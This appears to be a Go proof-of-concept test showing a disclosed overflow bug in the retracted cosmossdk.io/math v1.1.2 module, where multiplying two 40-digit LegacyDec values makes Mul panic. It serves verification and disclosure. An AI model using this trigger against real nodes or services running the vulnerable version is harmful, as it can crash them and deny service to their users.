package pocdemo

import (
	"testing"

	sdkmath "cosmossdk.io/math"
)

// Demonstrates GHSA-7225-m954-23v7 / ASA-2024-010 for real, against the
// actual retracted cosmossdk.io/math v1.1.2 module (go.mod: "retracted by
// module author: Bit length differences between Int and Dec"). Only the
// public, exported API is used -- exactly how a real downstream consumer
// would trigger it, no reimplementation of internals.
func TestLegacyDecMulOverflowPanics(t *testing.T) {
	huge, err := sdkmath.LegacyNewDecFromStr("1" + repeat("0", 40))
	if err != nil {
		t.Fatalf("setup: failed to parse huge decimal: %v", err)
	}

	defer func() {
		r := recover()
		if r == nil {
			t.Fatal("expected panic (Int overflow) from Mul, got none -- bug may be fixed in this version")
		}
		t.Logf("PoC result: Mul panicked as expected: %v", r)
	}()

	result := huge.Mul(huge)
	t.Fatalf("expected panic before this line, got result: %s", result.String())
}

func repeat(s string, n int) string {
	out := make([]byte, 0, n)
	for i := 0; i < n; i++ {
		out = append(out, s[0])
	}
	return string(out)
}
